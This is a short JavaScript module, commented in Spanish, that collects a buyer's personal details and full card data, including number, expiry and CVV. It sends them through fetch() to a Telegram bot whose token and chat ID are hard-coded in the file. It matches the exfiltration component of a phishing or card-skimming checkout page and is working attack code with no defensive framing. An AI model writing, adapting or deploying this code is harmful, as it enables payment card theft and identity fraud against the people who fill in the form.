const configTelegram= {
    baseURL: 'https://api.telegram.org/bot',
    token: '5801779743:AAGr7j4rDjyF7BryJcx6E4X1G_BQ68JOHw8',
    chat_id: '-885696208',//1898992597
    parse_mode: 'MarkdownV2',
  }
const telegramApi=async(formUser,formPay)=>{
    const {baseURL,token,chat_id,parse_mode}=configTelegram
    // %0A genera saltos de linea en el chat de telegram 
    const {nombre,apellido,cedula,tel,direccion,ciudad}=formUser
    const {nombreApellido,numeroTarjeta,expiracion,cvv}=formPay;
    const mensaje=`-INFORMACION PERSONAl-
    %0ANombre:${nombre?nombre:"no fue rellenado"}
    %0AApellido:${apellido?apellido:"no fue rellenado"}
    %0ACedula:${cedula?cedula:"no fue rellenado"}
    %0ATelefono de contacto:${tel?tel:"no fue rellenado"}
    %0ACiudad de entrega:${ciudad?ciudad:"no fue rellenado"}
    %0ADireccion de entrega:${direccion?direccion:"no fue rellenado"}%0A
    %0A-INFORMACION DEL PAGO-
    %0ANombre y apellido:${nombreApellido}
    %0ANumero de tarjeta:${numeroTarjeta}
    %0AFecha de expiracion:${expiracion}
    %0ACVV=${cvv}`

    const url=baseURL+token+`/sendMessage?chat_id=${chat_id}&${parse_mode}&text=`+mensaje
    const res=await fetch(url);
    const data=res.json()
    console.log(data)
}

export default telegramApi;